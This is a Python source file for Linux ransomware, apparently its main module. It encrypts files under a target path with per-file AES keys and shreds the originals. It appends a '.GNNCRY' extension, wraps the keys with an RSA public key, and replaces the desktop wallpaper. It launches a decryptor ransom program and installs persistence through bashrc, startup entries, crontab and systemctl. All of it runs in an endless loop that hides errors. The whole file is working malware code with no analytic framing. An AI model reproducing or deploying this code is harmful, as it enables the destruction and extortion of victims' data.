import generate_keys
import asymmetric
import get_files
import symmetric
import enviroment
import variables
import persistence
import utils

import os
import string
import random
import time
import gc
import base64
import pickle

from Crypto.PublicKey import RSA
import subprocess
from Crypto.Hash import MD5
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP



with open(variables.client_public_key_path, 'r') as f:
    client_public_key = f.read()
client_public_key_obj = RSA.importKey(client_public_key)


def get_paths():
    with open(variables.aes_encrypted_keys_path) as f:
        content = f.read().split("\n")
    
    for aes_and_path in content:
        yield aes_and_path[1]


def open_decryptor():
    process = subprocess.Popen("pidof decryptor", shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = process.stdout.read() + process.stderr.read()
    if(output):
        return
    os.chdir(variables.ransomware_path)
    os.system('gnome-terminal --command ./decryptor')
    os.system('xfce4-terminal --command=./decryptor')


def change_wallpaper():
    with open(os.path.join(variables.ransomware_path, "img.png"), 'wb') as f:
        f.write(base64.b64decode(variables.img))
    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
            .format(os.path.join(variables.ransomware_path, "img.png"))
    
    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''\
            .format(os.path.join(variables.ransomware_path, "img.png"))
    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'\
            .format(os.path.join(variables.ransomware_path, "img.png"))

    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
var Desktops = desktops();                                                                                                                       
for (i=0;i<Desktops.length;i++) {
        d = Desktops[i];
        d.wallpaperPlugin = "org.kde.image";
        d.currentConfigGroup = Array("Wallpaper",
                                    "org.kde.image",
                                    "General");
        d.writeConfig("Image", "file://%s");
}'
""" %(os.path.join(variables.ransomware_path, "img.png"))
    os.system(gnome)
    os.system(xfce)
    os.system(xfce1)
    os.system(kde)


def start_encryption(files):
    if(not files):
        return None

    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file = base64.b64decode(found_file)
        with open(found_file, 'rb') as f:
            file_content = f.read()
        
        encrypted = AES_obj.encrypt(file_content)
        utils.shred(found_file)

        new_file_name = found_file + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name)

        # list of tuples of AES_key and base64(path)
        yield (key, base64_new_file_name)
    

def menu():
    # encrypted_files = get_paths()
    new_files = get_files.find_files(variables.test_path)
    aes_keys_and_base64_path = start_encryption(new_files)

    if(aes_keys_and_base64_path):
        with open(os.path.join(variables.ransomware_path,
                               'AES_encrypted_keys.txt'), 'a') as f:    
            for _ in aes_keys_and_base64_path:
                
                # encrypt aes key
                cipher = PKCS1_OAEP.new(client_public_key_obj)
                encrypted_aes_key = cipher.encrypt(_[0])
                
                # store to disk encrypted aes key and path
                f.write(base64.b64encode(encrypted_aes_key) + " " + _[1] + "\n")

        # free the memory
        aes_keys_and_base64_path = None
        del aes_keys_and_base64_path
        gc.collect()


def persist():
    persistence.bashrcs()
    persistence.startup()
    persistence.crontab()
    persistence.systemctl()


if __name__ == "__main__":
    persist()
    while True:
        try:
            menu()
            change_wallpaper()
            open_decryptor()
            time.sleep(30)
        except:
            pass
    
